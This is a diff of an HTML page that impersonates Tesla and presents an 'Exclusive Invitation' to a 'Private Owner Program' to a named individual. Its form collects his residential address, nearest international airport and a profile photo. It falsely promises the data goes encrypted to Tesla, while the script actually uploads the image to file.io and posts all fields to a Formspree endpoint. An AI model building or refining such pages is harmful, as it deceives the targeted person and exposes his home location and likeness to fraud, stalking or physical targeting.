@@ -10,221 +10,73 @@
 
 <style>
 :root {
---tesla-red: #e31937;
---bg-dark: #050505;
---card-bg: #0f0f0f;
---border-color: rgba(255, 255, 255, 0.1);
---text-main: #ffffff;
---text-dim: #888888;
+    --tesla-red: #e31937;
+    --bg-dark: #050505;
+    --card-bg: #0f0f0f;
+    --border-color: rgba(255, 255, 255, 0.1);
+    --text-main: #ffffff;
+    --text-dim: #888888;
 }
 
-*, *::before, *::after {
-margin: 0;
-padding: 0;
-box-sizing: border-box;
-font-family: 'Inter', sans-serif;
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; }
+body { background-color: var(--bg-dark); color: var(--text-main); overflow-x:hidden; min-height:100vh; position:relative; }
+
+.bg-grid { position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); z-index:-1; }
+
+.particle { position:absolute; border-radius:50%; opacity:0.7; pointer-events:none; animation:particleAnim 5s infinite; }
+@keyframes particleAnim { 0% { transform: translateY(0); opacity:1; } 100% { transform: translateY(-100vh); opacity:0; } }
+
+.container { max-width:600px; margin:auto; padding:40px 20px; display:flex; flex-direction:column; justify-content:center; min-height:100vh; }
+.hidden { display:none !important; }
+
+.tesla-card { background: var(--card-bg); border:1px solid var(--border-color); border-radius:24px; padding:40px; position:relative; overflow:hidden; box-shadow:0 30px 60px rgba(0,0,0,0.5); transition:border 0.3s ease-in-out; }
+
+.glow-border { box-shadow: 0 0 20px var(--tesla-red), 0 0 40px var(--tesla-red), 0 0 60px var(--tesla-red); }
+
+.logo-container { text-align:center; margin-bottom:40px; }
+
+/* Tesla animated bold text */
+.tesla-text { 
+    font-size: 3rem; font-weight: bold; color: var(--tesla-red); 
+    text-shadow: 0 0 5px var(--tesla-red),0 0 10px var(--tesla-red); 
+    white-space: nowrap; overflow:hidden; border-right:0.15em solid var(--tesla-red);
+    width:0; animation: typing 2s steps(5,end) forwards, blink-caret 0.75s step-end infinite;
+}
+@keyframes typing { from { width:0; } to { width:5ch; } }
+@keyframes blink-caret { 50% { border-color: transparent; } }
+
+.tesla-logo-img { width:180px; filter: brightness(0) invert(1); animation: logoFloat 4s ease-in-out infinite; }
+@keyframes logoFloat{ 0%{transform:translateY(0)}50%{transform:translateY(-6px)}100%{transform:translateY(0)} }
+
+h1 { font-size:1.8rem; font-weight:200; letter-spacing:4px; text-transform:uppercase; margin-bottom:15px; }
+.red-accent { color: var(--tesla-red); font-weight:800; letter-spacing:2px; font-size:0.7rem; text-transform:uppercase; margin-bottom:5px; display:block; }
+
+.btn-primary { background: var(--tesla-red); color:white; border:none; padding:18px 30px; border-radius:12px; font-weight:700; width:100%; cursor:pointer; transition:0.3s; text-transform:uppercase; letter-spacing:2px; margin-top:20px; }
+.btn-primary:hover { transform: translateY(-2px); box-shadow:0 10px 20px rgba(227,25,55,0.3); }
+.btn-primary:disabled { background:#555; cursor:not-allowed; box-shadow:none; transform:none; }
+
+.btn-outline { background:transparent; color: var(--text-dim); border:1px solid var(--border-color); padding:15px; border-radius:12px; width:100%; cursor:pointer; margin-top:10px; }
+
+.form-group { margin-bottom:20px; }
+label { display:block; font-size:0.7rem; color:var(--text-dim); text-transform:uppercase; margin-bottom:8px; }
+input { width:100%; background: rgba(255,255,255,0.03); border:1px solid var(--border-color); padding:15px; border-radius:10px; color:white; font-size:1rem; transition:0.3s; }
+input:focus { outline:none; border-color: var(--tesla-red); background: rgba(255,255,255,0.07); }
+input.error { border-color:red; }
+
+.checkbox-wrapper { display:flex; gap:12px; align-items:flex-start; margin-top:25px; }
+.checkbox-wrapper input { width:20px; height:20px; cursor:pointer; accent-color: var(--tesla-red); }
+
+.status-bar { height:4px; background:#222; border-radius:2px; margin:20px 0; overflow:hidden; }
+.status-progress { height:100%; background: var(--tesla-red); width:65%; transition:width 0.5s; }
+
+#loadingOverlay {
+    position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; display:flex; flex-direction:column; justify-content:center; align-items:center; color:white; font-size:1.2rem; display:none;
 }
 
-body {
-background-color: var(--bg-dark);
-color: var(--text-main);
-overflow-x: hidden;
-min-height: 100vh;
-position: relative;
-}
+@keyframes pulse { 0%{opacity:0.3;}50%{opacity:1;}100%{opacity:0.3;} }
+#loadingOverlay i { font-size:3rem; animation:pulse 1.5s infinite; }
 
-.bg-grid {
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: rgba(0, 0, 0, 0.8);
-z-index: -1;
-}
-
-/* Particle Animation */
-.particle {
-position: absolute;
-border-radius: 50%;
-opacity: 0.7;
-pointer-events: none;
-animation: particleAnim 5s infinite;
-}
-
-@keyframes particleAnim {
-0% { transform: translateY(0); opacity: 1; }
-100% { transform: translateY(-100vh); opacity: 0; }
-}
-
-.container {
-max-width: 600px;
-margin: auto;
-padding: 40px 20px;
-display: flex;
-flex-direction: column;
-justify-content: center;
-min-height: 100vh;
-}
-
-.hidden { display: none !important; }
-
-.tesla-card {
-background: var(--card-bg);
-border: 1px solid var(--border-color);
-border-radius: 24px;
-padding: 40px;
-position: relative;
-overflow: hidden;
-box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
-transition: border 0.3s ease-in-out;
-}
-
-.glow-border {
-box-shadow: 0 0 20px var(--tesla-red), 0 0 40px var(--tesla-red), 0 0 60px var(--tesla-red);
-}
-
-.logo-container {
-text-align: center;
-margin-bottom: 40px;
-}
-
-.tesla-logo-img {
-width: 180px;
-filter: brightness(0) invert(1);
-animation: logoFloat 4s ease-in-out infinite;
-}
-
-@keyframes logoFloat{
-0%{transform:translateY(0)}
-50%{transform:translateY(-6px)}
-100%{transform:translateY(0)}
-}
-
-h1 {
-font-size: 1.8rem;
-font-weight: 200;
-letter-spacing: 4px;
-text-transform: uppercase;
-margin-bottom: 15px;
-}
-
-.red-accent {
-color: var(--tesla-red);
-font-weight: 800;
-letter-spacing: 2px;
-font-size: 0.7rem;
-text-transform: uppercase;
-margin-bottom: 5px;
-display: block;
-}
-
-.btn-primary {
-background: var(--tesla-red);
-color: white;
-border: none;
-padding: 18px 30px;
-border-radius: 12px;
-font-weight: 700;
-width: 100%;
-cursor: pointer;
-transition: 0.3s;
-text-transform: uppercase;
-letter-spacing: 2px;
-margin-top: 20px;
-}
-
-.btn-primary:hover {
-transform: translateY(-2px);
-box-shadow: 0 10px 20px rgba(227, 25, 55, 0.3);
-animation: glow 0.5s forwards;
-}
-
-.btn-primary:disabled {
-background: #555;
-cursor: not-allowed;
-box-shadow: none;
-transform: none;
-}
-
-@keyframes glow {
-0% { box-shadow: 0 0 20px transparent; }
-100% { box-shadow: 0 0 20px var(--tesla-red); }
-}
-
-.btn-outline {
-background: transparent;
-color: var(--text-dim);
-border: 1px solid var(--border-color);
-padding: 15px;
-border-radius: 12px;
-width: 100%;
-cursor: pointer;
-margin-top: 10px;
-}
-
-.form-group { margin-bottom: 20px; }
-
-label {
-display: block;
-font-size: 0.7rem;
-color: var(--text-dim);
-text-transform: uppercase;
-margin-bottom: 8px;
-}
-
-input {
-width: 100%;
-background: rgba(255, 255, 255, 0.03);
-border: 1px solid var(--border-color);
-padding: 15px;
-border-radius: 10px;
-color: white;
-font-size: 1rem;
-transition: 0.3s;
-}
-
-input:focus {
-outline: none;
-border-color: var(--tesla-red);
-background: rgba(255, 255, 255, 0.07);
-}
-
-input.error { border-color: red; }
-
-.checkbox-wrapper {
-display: flex;
-gap: 12px;
-align-items: flex-start;
-margin-top: 25px;
-}
-
-.checkbox-wrapper input {
-width: 20px;
-height: 20px;
-cursor: pointer;
-accent-color: var(--tesla-red);
-}
-
-.status-bar {
-height: 4px;
-background: #222;
-border-radius: 2px;
-margin: 20px 0;
-overflow: hidden;
-}
-
-.status-progress {
-height: 100%;
-background: var(--tesla-red);
-width: 65%;
-transition: width 0.5s;
-}
-
-@media (max-width: 600px) {
-h1 { font-size: 1.5rem; }
-.tesla-logo-img { width: 150px; }
-}
+@media(max-width:600px){ h1{ font-size:1.5rem; } .tesla-logo-img{ width:150px; } .tesla-text{ font-size:2rem; } }
 </style>
 </head>
 <body>
@@ -235,117 +87,116 @@ h1 { font-size: 1.5rem; }
 
 <!-- Step Verify -->
 <div id="step-verify" class="tesla-card glow-border fade-in">
-<div class="logo-container">
-<img src="https://i.imgur.com/BvVUaDT.png" alt="Tesla Logo" class="tesla-logo-img">
-</div>
-<center>
-<span class="red-accent" style="font-size:0.8rem; letter-spacing:2px;">Exclusive Invitation</span>
-<h1>Private Owner Program</h1>
-<p style="color: var(--text-dim); margin-bottom: 30px; line-height: 1.6;">
-<strong>Steven Venditti</strong>, you have been selected for enrollment into Tesla's most prestigious ownership tier. This invitation is non-transferable.
-</p>
-<button class="btn-primary" onclick="goToStep('step-offer')">View Invitation Details</button>
-</center>
+    <div class="logo-container">
+        <h1 class="tesla-text">Tesla</h1>
+    </div>
+    <center>
+        <span class="red-accent">Exclusive Invitation</span>
+        <h1>Private Owner Program</h1>
+        <p style="color: var(--text-dim); margin-bottom:30px; line-height:1.6;">
+            <strong>Steven Venditti</strong>, you have been selected for enrollment into Tesla's most prestigious ownership tier. This invitation is non-transferable.
+        </p>
+        <button class="btn-primary" onclick="goToStep('step-offer')">View Invitation Details</button>
+    </center>
 </div>
 
 <!-- Step Offer -->
 <div id="step-offer" class="tesla-card hidden fade-in glow-border">
-<span class="red-accent" style="font-size:0.8rem; letter-spacing:2px;">Membership Privileges</span>
-<h1>Elite Tier Access</h1>
-<p style="color: var(--text-dim); margin-bottom: 30px;">Membership grants you unparalleled access to the future of sustainable energy and transport.</p>
-<button class="btn-primary" onclick="goToStep('step-form')">Accept Invitation</button>
-<button class="btn-outline" onclick="location.reload()">Decline Offer</button>
+    <span class="red-accent">Membership Privileges</span>
+    <h1>Elite Tier Access</h1>
+    <p style="color: var(--text-dim); margin-bottom:30px;">Membership grants you unparalleled access to the future of sustainable energy and transport.</p>
+    <button class="btn-primary" onclick="goToStep('step-form')">Accept Invitation</button>
+    <button class="btn-outline" onclick="location.reload()">Decline Offer</button>
 </div>
 
 <!-- Step Form -->
 <div id="step-form" class="tesla-card hidden fade-in glow-border">
-<span class="red-accent" style="font-size:0.8rem; letter-spacing:2px;">Secure Enrollment</span>
-<h1>Submit Profile Details</h1>
-<p style="color: var(--text-dim); margin-bottom: 25px;">Please complete your profile. All data is encrypted and sent directly to Tesla Private Client Relations.</p>
+    <span class="red-accent">Secure Enrollment</span>
+    <h1>Submit Profile Details</h1>
+    <p style="color: var(--text-dim); margin-bottom:25px;">Please complete your profile. All data is encrypted and sent directly to Tesla Private Client Relations.</p>
 
-<form id="enrollmentForm" action="https://formspree.io/f/xykdwykg" method="POST" enctype="multipart/form-data">
-<div class="form-group">
-<label>Full Name</label>
-<input type="text" id="form-name" name="Full_Name" value="Steven Venditti" readonly>
-</div>
-<div class="form-group">
-<label>Residential Address</label>
-<input type="text" id="form-address" name="Residential_Address" placeholder="Enter full residential address" required>
-</div>
-<div class="form-group">
-<label>Nearest International Airport</label>
-<input type="text" id="form-airport" name="Nearest_Airport" placeholder="e.g. JFK, LAX, LHR" required>
-</div>
-<div class="form-group">
-<label>Profile Image (Upload)</label>
-<input type="file" id="form-image" name="Profile_Image" accept="image/*" required>
-</div>
-
-<label class="checkbox-wrapper">
-<input type="checkbox" id="terms" name="Agreed_To_Terms" required>
-<span>I agree to the Tesla Private Program Terms and Conditions, including strict non-disclosure of exclusive software features.</span>
-</label>
-
-<button type="submit" id="submitBtn" class="btn-primary">Complete Enrollment</button>
-</form>
+    <form id="enrollmentForm" action="https://formspree.io/f/xykdwykg" method="POST">
+        <div class="form-group">
+            <label>Full Name</label>
+            <input type="text" id="form-name" name="Full_Name" value="Steven Venditti" readonly>
+        </div>
+        <div class="form-group">
+            <label>Residential Address</label>
+            <input type="text" id="form-address" name="Residential_Address" placeholder="Enter full residential address" required>
+        </div>
+        <div class="form-group">
+            <label>Nearest International Airport</label>
+            <input type="text" id="form-airport" name="Nearest_Airport" placeholder="e.g. JFK, LAX, LHR" required>
+        </div>
+        <div class="form-group">
+            <label>Profile Image (Upload)</label>
+            <input type="file" id="form-image" name="Profile_Image" accept="image/*" required>
+        </div>
+        <label class="checkbox-wrapper">
+            <input type="checkbox" id="terms" name="Agreed_To_Terms" required>
+            <span>I agree to the Tesla Private Program Terms and Conditions, including strict non-disclosure of exclusive software features.</span>
+        </label>
+        <button type="submit" id="submitBtn" class="btn-primary">Complete Enrollment</button>
+    </form>
 </div>
 
 <!-- Step Pending -->
 <div id="step-pending" class="tesla-card hidden fade-in glow-border">
-<center>
-<i class="fas fa-shield-check" style="font-size: 4rem; color: var(--tesla-red); margin-bottom: 20px;"></i>
-<span class="red-accent" style="font-size:0.8rem; letter-spacing:2px;">Application Received</span>
-<h1>Under Review</h1>
-<p style="color: var(--text-dim); margin-bottom: 20px;">Thank you, Steven. Your enrollment package is being processed by our Private Client Team.</p>
-<div style="text-align: left; background: #000; padding: 20px; border-radius: 15px; margin-bottom: 20px;">
-<div style="display: flex; justify-content: space-between; font-size: 0.7rem; color: var(--text-dim);">
-<span>ENROLLMENT STATUS</span>
-<span style="color: var(--tesla-red);">PROCESSING</span>
-</div>
-<div class="status-bar">
-<div class="status-progress" style="width: 100%;"></div>
-</div>
-<p style="font-size: 0.7rem; color: #555;">Next: Profile Verification & Digital ID Issuance</p>
-</div>
-<p style="font-size: 0.85rem; color: var(--text-dim); line-height: 1.6;">
-You will be contacted via your registered email upon successful enrollment. Once approved, you will receive full access to your account profile and the Private Owner Program dashboard.
-</p>
-<button class="btn-outline" style="margin-top: 30px;" onclick="location.reload()">Close Portal</button>
-</center>
+    <center>
+        <i class="fas fa-shield-check" style="font-size: 4rem; color: var(--tesla-red); margin-bottom:20px;"></i>
+        <span class="red-accent">Application Received</span>
+        <h1>Under Review</h1>
+        <p style="color: var(--text-dim); margin-bottom:20px;">Thank you, Steven. Your enrollment package is being processed by our Private Client Team.</p>
+        <div style="text-align:left; background:#000; padding:20px; border-radius:15px; margin-bottom:20px;">
+            <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:var(--text-dim);">
+                <span>ENROLLMENT STATUS</span>
+                <span style="color: var(--tesla-red);">PROCESSING</span>
+            </div>
+            <div class="status-bar"><div class="status-progress" style="width:100%;"></div></div>
+            <p style="font-size:0.7rem; color:#555;">Next: Profile Verification & Digital ID Issuance</p>
+        </div>
+        <p style="font-size:0.85rem; color: var(--text-dim); line-height:1.6;">
+            You will be contacted via your registered email upon successful enrollment. Once approved, you will receive full access to your account profile and the Private Owner Program dashboard.
+        </p>
+        <button class="btn-outline" style="margin-top:30px;" onclick="location.reload()">Close Portal</button>
+    </center>
 </div>
 
-<p style="text-align: center; color: #333; font-size: 0.7rem; margin-top: 30px; letter-spacing: 1px;">
-© 2026 TESLA PRIVATE OWNER PROGRAM | SECURE NODE 08842
+<p style="text-align:center; color:#333; font-size:0.7rem; margin-top:30px; letter-spacing:1px;">
+    © 2026 TESLA PRIVATE OWNER PROGRAM | SECURE NODE 08842
 </p>
-</div>
+
+<!-- Loading Overlay -->
+<div id="loadingOverlay"><i class="fas fa-spinner"></i><span style="margin-top:15px;">Uploading & Submitting...</span></div>
 
 <script>
 // Particle Background
 const createParticle = (e) => {
-const particle = document.createElement('div');
-particle.className = 'particle';
-particle.style.width = Math.random() * 15 + 'px';
-particle.style.height = particle.style.width;
-particle.style.left = e.pageX + 'px';
-particle.style.top = e.pageY + 'px';
-particle.style.backgroundColor = 'rgba(227, 25, 55, ' + Math.random() + ')';
-document.body.appendChild(particle);
-setTimeout(() => particle.remove(), 2000);
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.style.width = Math.random()*15+'px';
+    particle.style.height = particle.style.width;
+    particle.style.left = e.pageX+'px';
+    particle.style.top = e.pageY+'px';
+    particle.style.backgroundColor = 'rgba(227,25,55,'+Math.random()+')';
+    document.body.appendChild(particle);
+    setTimeout(()=>particle.remove(),2000);
 };
 document.addEventListener('mousemove', createParticle);
 
 // Step navigation
-function goToStep(stepId) {
-document.querySelectorAll('.tesla-card').forEach(card => card.classList.add('hidden'));
-document.getElementById(stepId).classList.remove('hidden');
-window.scrollTo(0, 0);
+function goToStep(stepId){
+    document.querySelectorAll('.tesla-card').forEach(c=>c.classList.add('hidden'));
+    document.getElementById(stepId).classList.remove('hidden');
+    window.scrollTo(0,0);
 }
 
-// Form submission with File.io integration
+// Form submission with loading simulation
 const form = document.getElementById("enrollmentForm");
 const submitBtn = document.getElementById("submitBtn");
+const overlay = document.getElementById("loadingOverlay");
 
-form.addEventListener("submit", async function(event) {
+form.addEventListener("submit", async function(event){
 event.preventDefault();
 
 const address = document.getElementById('form-address');
@@ -353,63 +204,36 @@ const airport = document.getElementById('form-airport');
 const image = document.getElementById('form-image');
 const terms = document.getElementById('terms');
 
-let valid = true;
-[address, airport].forEach(el => {
-    if (!el.value) { el.classList.add('error'); valid = false; } else { el.classList.remove('error'); }
-});
-if (!image.files.length) { alert("Please upload a Profile Image (it will be sent as a link)."); valid = false; }
-if (!terms.checked) { alert("You must accept the terms and conditions to proceed."); valid = false; }
+let valid=true;
+[address, airport].forEach(el=>{if(!el.value){el.classList.add('error'); valid=false;} else{el.classList.remove('error');}});
+if(!image.files.length){ alert("Please upload a Profile Image."); valid=false;}
+if(!terms.checked){ alert("You must accept the terms."); valid=false;}
+if(!valid) return;
 
-if (!valid) return;
+submitBtn.disabled=true;
+overlay.style.display="flex";
 
-submitBtn.textContent = "Submitting...";
-submitBtn.disabled = true;
-
-try {
-    let formData = new FormData(form);
+try{
+    let formData = new FormData();
+    formData.append("Full_Name", address.value?document.getElementById('form-name').value:"");
+    formData.append("Residential_Address", address.value);
+    formData.append("Nearest_Airport", airport.value);
 
     // Upload file to File.io
-    if (image.files.length) {
-        const fileData = new FormData();
-        fileData.append("file", image.files[0]);
+    const fileData = new FormData();
+    fileData.append("file", image.files[0]);
+    const fileResp = await fetch("https://file.io/?expires=7d",{method:"POST", body:fileData});
+    const fileResult = await fileResp.json();
+    if(!fileResult.success) throw new Error("File upload failed");
+    formData.append("Profile_Image_Link", fileResult.link);
 
-        const fileResponse = await fetch("https://file.io/?expires=7d", {
-            method: "POST",
-            body: fileData
-        });
+    // Submit to Formspree
+    const resp = await fetch(form.action,{method:"POST", body:formData, headers:{'Accept':'application/json'}});
+    if(resp.ok){ goToStep('step-pending'); } 
+    else { throw new Error("Form submission failed"); }
+} catch(e){ alert("Oops! Problem submitting: "+e.message); }
+finally{ overlay.style.display="none"; submitBtn.disabled=false; }
 
-        const fileResult = await fileResponse.json();
-        if (!fileResult.success) throw new Error("File upload failed");
-
-        formData.delete("Profile_Image");
-        formData.append("Profile_Image_Link", fileResult.link);
-    }
-
-    // Send to Formspree
-    const response = await fetch(form.action, {
-        method: form.method,
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-    });
-
-    if (response.ok) {
-        goToStep('step-pending');
-    } else {
-        const data = await response.json();
-        if (Object.hasOwn(data, 'errors')) {
-            alert(data["errors"].map(e => e.message).join(", "));
-        } else {
-            alert("Oops! There was a problem submitting your form");
-        }
-        submitBtn.textContent = "Complete Enrollment";
-        submitBtn.disabled = false;
-    }
-
-} catch (error) {
-    alert("Oops! There was a problem submitting your form: " + error.message);
-    submitBtn.textContent = "Complete Enrollment";
-    submitBtn.disabled = false;
-}
 });
 </script>
 </body>
